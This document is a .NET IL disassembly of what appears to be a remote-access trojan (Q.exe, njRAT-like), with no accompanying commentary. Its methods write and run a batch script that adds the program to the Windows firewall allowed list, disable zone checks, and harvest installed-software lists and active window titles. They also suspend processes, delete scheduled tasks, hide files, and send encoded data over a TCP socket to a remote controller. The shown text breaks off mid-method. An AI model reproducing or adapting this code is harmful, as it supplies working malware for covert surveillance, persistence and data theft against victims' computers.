
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.0.30319.33440
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern user32.dll
.module extern kernel32
.module extern ntdll
.module extern ntdll.dll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly Q
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module Q.exe
// MVID: {E977ED4A-5B81-42C3-AF6C-BA54F41F6515}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x00230000


// =============== CLASS MEMBERS DECLARATION ===================

.class public auto ansi Q.Accessories
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Accessories::.ctor

  .method public static void  Install() cil managed
  {
    // Code size       191 (0xbf)
    .maxstack  4
    .locals init (string[] V_0)
    .try
    {
      IL_0000:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_0005:  ldstr      "1"
      IL_000a:  ldc.i4.1
      IL_000b:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_0010:  leave.s    IL_001e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0012:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0017:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001c:  leave.s    IL_001e

    }  // end handler
    IL_001e:  ldsfld     string Q.SettingPad::Sti
    IL_0023:  ldstr      "\\"
    IL_0028:  ldsfld     string Q.SettingPad::RG
    IL_002d:  ldstr      ".bat"
    IL_0032:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_0037:  ldc.i4.s   9
    IL_0039:  newarr     [mscorlib]System.String
    IL_003e:  stloc.0
    IL_003f:  ldloc.0
    IL_0040:  ldc.i4.0
    IL_0041:  ldstr      "Sleep 5\r\nnetsh firewall add allowedprogram \""
    IL_0046:  stelem.ref
    IL_0047:  ldloc.0
    IL_0048:  ldc.i4.1
    IL_0049:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
    IL_004e:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
    IL_0053:  stelem.ref
    IL_0054:  ldloc.0
    IL_0055:  ldc.i4.2
    IL_0056:  ldstr      "\" \""
    IL_005b:  stelem.ref
    IL_005c:  ldloc.0
    IL_005d:  ldc.i4.3
    IL_005e:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
    IL_0063:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0068:  stelem.ref
    IL_0069:  ldloc.0
    IL_006a:  ldc.i4.4
    IL_006b:  ldstr      "\" ENABLE\r\ndel "
    IL_0070:  stelem.ref
    IL_0071:  ldloc.0
    IL_0072:  ldc.i4.5
    IL_0073:  ldsfld     string Q.SettingPad::Sti
    IL_0078:  stelem.ref
    IL_0079:  ldloc.0
    IL_007a:  ldc.i4.6
    IL_007b:  ldstr      "\\"
    IL_0080:  stelem.ref
    IL_0081:  ldloc.0
    IL_0082:  ldc.i4.7
    IL_0083:  ldsfld     string Q.SettingPad::RG
    IL_0088:  stelem.ref
    IL_0089:  ldloc.0
    IL_008a:  ldc.i4.8
    IL_008b:  ldstr      ".bat"
    IL_0090:  stelem.ref
    IL_0091:  ldloc.0
    IL_0092:  call       string [mscorlib]System.String::Concat(string[])
    IL_0097:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                     string)
    IL_009c:  ldsfld     string Q.SettingPad::Sti
    IL_00a1:  ldstr      "\\"
    IL_00a6:  ldsfld     string Q.SettingPad::RG
    IL_00ab:  ldstr      ".bat"
    IL_00b0:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_00b5:  ldc.i4.0
    IL_00b6:  ldc.i4.0
    IL_00b7:  ldc.i4.m1
    IL_00b8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_00bd:  pop
    IL_00be:  ret
  } // end of method Accessories::Install

  .method public static uint8[]  Z(uint8[] B) cil managed
  {
    // Code size       115 (0x73)
    .maxstack  4
    .locals init (uint8[] V_0,
             uint8[] V_1,
             int32 V_2,
             class [System]System.IO.Compression.GZipStream V_3,
             class [mscorlib]System.IO.MemoryStream V_4,
             uint8[] V_5)
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0006:  stloc.s    V_4
    IL_0008:  ldloc.s    V_4
    IL_000a:  ldc.i4.0
    IL_000b:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_0010:  stloc.3
    IL_0011:  ldc.i4.4
    IL_0012:  newarr     [mscorlib]System.Byte
    IL_0017:  stloc.1
    IL_0018:  ldloc.s    V_4
    IL_001a:  ldloc.s    V_4
    IL_001c:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_0021:  ldc.i4.5
    IL_0022:  conv.i8
    IL_0023:  sub.ovf
    IL_0024:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0029:  ldloc.s    V_4
    IL_002b:  ldloc.1
    IL_002c:  ldc.i4.0
    IL_002d:  ldc.i4.4
    IL_002e:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0033:  pop
    IL_0034:  ldloc.1
    IL_0035:  ldc.i4.0
    IL_0036:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_003b:  stloc.2
    IL_003c:  ldloc.s    V_4
    IL_003e:  ldc.i4.0
    IL_003f:  conv.i8
    IL_0040:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0045:  ldloc.2
    IL_0046:  ldc.i4.1
    IL_0047:  sub.ovf
    IL_0048:  ldc.i4.1
    IL_0049:  add.ovf
    IL_004a:  ldc.i4.1
    IL_004b:  sub.ovf
    IL_004c:  ldc.i4.1
    IL_004d:  add.ovf
    IL_004e:  newarr     [mscorlib]System.Byte
    IL_0053:  stloc.0
    IL_0054:  ldloc.3
    IL_0055:  ldloc.0
    IL_0056:  ldc.i4.0
    IL_0057:  ldloc.2
    IL_0058:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_005d:  pop
    IL_005e:  ldloc.3
    IL_005f:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0064:  ldloc.s    V_4
    IL_0066:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_006b:  ldloc.0
    IL_006c:  stloc.s    V_5
    IL_006e:  br.s       IL_0070

    IL_0070:  ldloc.s    V_5
    IL_0072:  ret
  } // end of method Accessories::Z

  .method public static string  GetInstall() cil managed
  {
    // Code size       196 (0xc4)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             string V_3,
             string V_4,
             string V_5,
             int32 V_6,
             string[] V_7,
             string[] V_8)
    IL_0000:  ldstr      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"
    IL_0005:  stloc.1
    IL_0006:  ldstr      ""
    IL_000b:  stloc.2
    IL_000c:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
    IL_0011:  ldloc.1
    IL_0012:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
    IL_0017:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetSubKeyNames()
    IL_001c:  stloc.s    V_7
    IL_001e:  ldc.i4.0
    IL_001f:  stloc.s    V_6
    IL_0021:  br         IL_00b3

    IL_0026:  ldloc.s    V_7
    IL_0028:  ldloc.s    V_6
    IL_002a:  ldelem.ref
    IL_002b:  stloc.3
    IL_002c:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
    IL_0031:  ldloc.1
    IL_0032:  ldloc.3
    IL_0033:  ldstr      "\\"
    IL_0038:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
    IL_0042:  ldstr      "DisplayName"
    IL_0047:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string)
    IL_004c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0051:  stloc.s    V_4
    IL_0053:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
    IL_0058:  ldloc.1
    IL_0059:  ldloc.3
    IL_005a:  ldstr      "\\"
    IL_005f:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0064:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
    IL_0069:  ldstr      "DisplayVersion"
    IL_006e:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string)
    IL_0073:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0078:  stloc.s    V_5
    IL_007a:  ldc.i4.5
    IL_007b:  newarr     [mscorlib]System.String
    IL_0080:  stloc.s    V_8
    IL_0082:  ldloc.s    V_8
    IL_0084:  ldc.i4.0
    IL_0085:  ldloc.2
    IL_0086:  stelem.ref
    IL_0087:  ldloc.s    V_8
    IL_0089:  ldc.i4.1
    IL_008a:  ldloc.s    V_4
    IL_008c:  stelem.ref
    IL_008d:  ldloc.s    V_8
    IL_008f:  ldc.i4.2
    IL_0090:  ldstr      "}{"
    IL_0095:  stelem.ref
    IL_0096:  ldloc.s    V_8
    IL_0098:  ldc.i4.3
    IL_0099:  ldloc.s    V_5
    IL_009b:  stelem.ref
    IL_009c:  ldloc.s    V_8
    IL_009e:  ldc.i4.4
    IL_009f:  ldstr      "}{"
    IL_00a4:  stelem.ref
    IL_00a5:  ldloc.s    V_8
    IL_00a7:  call       string [mscorlib]System.String::Concat(string[])
    IL_00ac:  stloc.2
    IL_00ad:  ldloc.s    V_6
    IL_00af:  ldc.i4.1
    IL_00b0:  add.ovf
    IL_00b1:  stloc.s    V_6
    IL_00b3:  ldloc.s    V_6
    IL_00b5:  ldloc.s    V_7
    IL_00b7:  ldlen
    IL_00b8:  conv.ovf.i4
    IL_00b9:  blt        IL_0026

    IL_00be:  ldloc.2
    IL_00bf:  stloc.0
    IL_00c0:  br.s       IL_00c2

    IL_00c2:  ldloc.0
    IL_00c3:  ret
  } // end of method Accessories::GetInstall

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static string  ActiveW() cil managed
  {
    // Code size       98 (0x62)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             native int V_2,
             string V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  call       native int Q.Accessories::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000c:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0011:  brfalse.s  IL_001b

      IL_0013:  ldstr      ""
      IL_0018:  stloc.0
      IL_0019:  leave.s    IL_0060

      IL_001b:  ldloc.2
      IL_001c:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0021:  call       int32 Q.Accessories::GetWindowTextLength(int64)
      IL_0026:  ldc.i4.1
      IL_0027:  add.ovf
      IL_0028:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_002d:  stloc.3
      IL_002e:  ldloc.2
      IL_002f:  ldloca.s   V_3
      IL_0031:  ldloc.3
      IL_0032:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0037:  call       int32 Q.Accessories::GetWindowText(native int,
                                                              string&,
                                                              int32)
      IL_003c:  pop
      IL_003d:  ldloca.s   V_3
      IL_003f:  call       string Q.BasicFunctions::ENB(string&)
      IL_0044:  stloc.1
      IL_0045:  leave.s    IL_005c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  dup
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  stloc.s    V_4
      IL_004f:  ldstr      ""
      IL_0054:  stloc.1
      IL_0055:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005a:  leave.s    IL_005c

    }  // end handler
    IL_005c:  ldloc.1
    IL_005d:  stloc.0
    IL_005e:  br.s       IL_0060

    IL_0060:  ldloc.0
    IL_0061:  ret
  } // end of method Accessories::ActiveW

} // end of class Q.Accessories

.class public auto ansi Q.BasicFunctions
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method BasicFunctions::.ctor

  .method private static pinvokeimpl("ntdll.dll" winapi) 
          bool  NtResumeProcess(native int hHandle) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("ntdll.dll" winapi) 
          bool  NtSuspendProcess(native int hHandle) cil managed preservesig
  {
  }
  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000c:  stloc.0
    IL_000d:  br.s       IL_000f

    IL_000f:  ldloc.0
    IL_0010:  ret
  } // end of method BasicFunctions::BS

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       20 (0x14)
    .maxstack  1
    .locals init (string V_0,
             uint8[] V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldind.ref
    IL_0002:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0007:  stloc.1
    IL_0008:  ldloca.s   V_1
    IL_000a:  call       string Q.BasicFunctions::BS(uint8[]&)
    IL_000f:  stloc.0
    IL_0010:  br.s       IL_0012

    IL_0012:  ldloc.0
    IL_0013:  ret
  } // end of method BasicFunctions::DEB

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (string V_0)
    IL_0000:  ldarg.0
    IL_0001:  call       uint8[] Q.BasicFunctions::SB(string&)
    IL_0006:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method BasicFunctions::ENB

  .method public static object  Thr(int32 t) cil managed
  {
    // Code size       8 (0x8)
    .maxstack  1
    .locals init (object V_0)
    IL_0000:  ldarg.0
    IL_0001:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0006:  ldloc.0
    IL_0007:  ret
  } // end of method BasicFunctions::Thr

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  2
    .locals init (uint8[] V_0)
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  stloc.0
    IL_000d:  br.s       IL_000f

    IL_000f:  ldloc.0
    IL_0010:  ret
  } // end of method BasicFunctions::SB

  .method public static object  St(object P) cil managed
  {
    // Code size       73 (0x49)
    .maxstack  9
    .locals init (object V_0,
             object[] V_1,
             object[] V_2,
             bool[] V_3)
    IL_0000:  ldnull
    IL_0001:  ldtoken    [System]System.Diagnostics.Process
    IL_0006:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_000b:  ldstr      "Start"
    IL_0010:  ldc.i4.1
    IL_0011:  newarr     [mscorlib]System.Object
    IL_0016:  stloc.1
    IL_0017:  ldloc.1
    IL_0018:  ldc.i4.0
    IL_0019:  ldarg.0
    IL_001a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_001f:  stelem.ref
    IL_0020:  ldloc.1
    IL_0021:  stloc.2
    IL_0022:  ldloc.2
    IL_0023:  ldnull
    IL_0024:  ldnull
    IL_0025:  ldc.i4.1
    IL_0026:  newarr     [mscorlib]System.Boolean
    IL_002b:  stloc.3
    IL_002c:  ldloc.3
    IL_002d:  ldc.i4.0
    IL_002e:  ldc.i4.1
    IL_002f:  stelem.i1
    IL_0030:  ldloc.3
    IL_0031:  ldc.i4.1
    IL_0032:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0037:  pop
    IL_0038:  ldloc.3
    IL_0039:  ldc.i4.0
    IL_003a:  ldelem.i1
    IL_003b:  brfalse.s  IL_0047

    IL_003d:  ldloc.2
    IL_003e:  ldc.i4.0
    IL_003f:  ldelem.ref
    IL_0040:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0045:  starg.s    P
    IL_0047:  ldloc.0
    IL_0048:  ret
  } // end of method BasicFunctions::St

  .method public static bool  SendIt(string S) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  1
    .locals init (bool V_0)
    IL_0000:  ldarga.s   S
    IL_0002:  call       uint8[] Q.BasicFunctions::SB(string&)
    IL_0007:  call       bool Q.BasicFunctions::SendMe(uint8[])
    IL_000c:  stloc.0
    IL_000d:  br.s       IL_000f

    IL_000f:  ldloc.0
    IL_0010:  ret
  } // end of method BasicFunctions::SendIt

  .method public static bool  SendMe(uint8[] b) cil managed
  {
    // Code size       229 (0xe5)
    .maxstack  4
    .locals init (bool V_0,
             class [mscorlib]System.IO.FileInfo V_1,
             uint8[] V_2,
             int32 V_3,
             class [mscorlib]System.IO.MemoryStream V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.IO.FileInfo V_7,
             string V_8)
    IL_0000:  ldsfld     bool Q.SettingPad::Cn
    IL_0005:  brtrue.s   IL_000e

    IL_0007:  ldc.i4.0
    IL_0008:  stloc.0
    IL_0009:  br         IL_00e3

    .try
    {
      IL_000e:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
      IL_0013:  stloc.1
      IL_0014:  ldloc.1
      IL_0015:  stloc.s    V_7
      IL_0017:  ldloc.s    V_7
      IL_0019:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_001e:  ldsfld     bool Q.SettingPad::Cn
        IL_0023:  brtrue.s   IL_002c

        IL_0025:  ldc.i4.0
        IL_0026:  stloc.0
        IL_0027:  leave      IL_00e3

        IL_002c:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0031:  stloc.s    V_4
        IL_0033:  ldarg.0
        IL_0034:  ldlen
        IL_0035:  conv.ovf.i4
        IL_0036:  stloc.3
        IL_0037:  ldloca.s   V_3
        IL_0039:  call       instance string [mscorlib]System.Int32::ToString()
        IL_003e:  ldstr      bytearray (00 00 ) 
        IL_0043:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0048:  stloc.s    V_8
        IL_004a:  ldloca.s   V_8
        IL_004c:  call       uint8[] Q.BasicFunctions::SB(string&)
        IL_0051:  stloc.2
        IL_0052:  ldloc.s    V_4
        IL_0054:  ldloc.2
        IL_0055:  ldc.i4.0
        IL_0056:  ldloc.2
        IL_0057:  ldlen
        IL_0058:  conv.ovf.i4
        IL_0059:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_005e:  ldloc.s    V_4
        IL_0060:  ldarg.0
        IL_0061:  ldc.i4.0
        IL_0062:  ldarg.0
        IL_0063:  ldlen
        IL_0064:  conv.ovf.i4
        IL_0065:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_006a:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
        IL_006f:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0074:  newobj     instance void [System]System.Net.Sockets.NetworkStream::.ctor(class [System]System.Net.Sockets.Socket)
        IL_0079:  stsfld     class [System]System.Net.Sockets.NetworkStream Q.SettingPad::NT
        IL_007e:  ldsfld     class [System]System.Net.Sockets.NetworkStream Q.SettingPad::NT
        IL_0083:  ldloc.s    V_4
        IL_0085:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_008a:  ldc.i4.0
        IL_008b:  ldloc.s    V_4
        IL_008d:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_0092:  conv.ovf.i4
        IL_0093:  callvirt   instance void [System]System.Net.Sockets.NetworkStream::Write(uint8[],
                                                                                           int32,
                                                                                           int32)
        IL_0098:  leave.s    IL_00a2

      }  // end .try
      finally
      {
        IL_009a:  ldloc.s    V_7
        IL_009c:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_00a1:  endfinally
      }  // end handler
      IL_00a2:  leave.s    IL_00db

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a4:  dup
      IL_00a5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00aa:  stloc.s    V_5
      .try
      {
        IL_00ac:  ldsfld     bool Q.SettingPad::Cn
        IL_00b1:  brfalse.s  IL_00c3

        IL_00b3:  ldc.i4.0
        IL_00b4:  stsfld     bool Q.SettingPad::Cn
        IL_00b9:  ldsfld     class [System]System.Net.Sockets.TcpClient Q.SettingPad::C
        IL_00be:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00c3:  leave.s    IL_00d4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00c5:  dup
        IL_00c6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00cb:  stloc.s    V_6
        IL_00cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00d2:  leave.s    IL_00d4

      }  // end handler
      IL_00d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d9:  leave.s    IL_00db

    }  // end handler
    IL_00db:  ldsfld     bool Q.SettingPad::Cn
    IL_00e0:  stloc.0
    IL_00e1:  br.s       IL_00e3

    IL_00e3:  ldloc.0
    IL_00e4:  ret
  } // end of method BasicFunctions::SendMe

  .method public static void  DS(string NS) cil managed
  {
    // Code size       28 (0x1c)
    .maxstack  4
    .locals init (string V_0)
    IL_0000:  ldstr      "SCHTASKS /Delete /TN \""
    IL_0005:  ldarg.0
    IL_0006:  ldstr      "\" /F"
    IL_000b:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0010:  stloc.0
    IL_0011:  ldloc.0
    IL_0012:  ldc.i4.0
    IL_0013:  ldc.i4.1
    IL_0014:  ldc.i4.m1
    IL_0015:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_001a:  pop
    IL_001b:  ret
  } // end of method BasicFunctions::DS

  .method public static object  Hx(string k) cil managed
  {
    // Code size       9 (0x9)
    .maxstack  2
    .locals init (object V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.2
    IL_0002:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                      valuetype [mscorlib]System.IO.FileAttributes)
    IL_0007:  ldloc.0
    IL_0008:  ret
  } // end of method BasicFunctions::Hx

  .method public static bool  RP(int32 ID) cil managed
  {
    // Code size       39 (0x27)
    .maxstack  2
    .locals init (bool V_0,
             bool V_1,
             class [mscorlib]System.Exception V_2)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0006:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000b:  call       bool Q.BasicFunctions::NtResumeProcess(native int)
      IL_0010:  stloc.0
      IL_0011:  leave.s    IL_0021

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0013:  dup
      IL_0014:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0019:  stloc.2
      IL_001a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001f:  leave.s    IL_0021

    }  // end handler
    IL_0021:  ldloc.0
    IL_0022:  stloc.1
    IL_0023:  br.s       IL_0025

    IL_0025:  ldloc.1
    IL_0026:  ret
  } // end of method BasicFunctions::RP

  .method public static bool  SP(int32 ID) cil managed
  {
    // Code size       41 (0x29)
    .maxstack  2
    .locals init (bool V_0,
             bool V_1,
             class [mscorlib]System.Exception V_2)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0006:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000b:  call       bool Q.BasicFunctions::NtSuspendProcess(native int)
      IL_0010:  stloc.0
      IL_0011:  leave.s    IL_0023

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0013:  dup
      IL_0014:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0019:  stloc.2
      IL_001a:  ldc.i4.0
      IL_001b:  stloc.0
      IL_001c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0021:  leave.s    IL_0023

    }  // end handler
    IL_0023:  ldloc.0
    IL_0024:  stloc.1
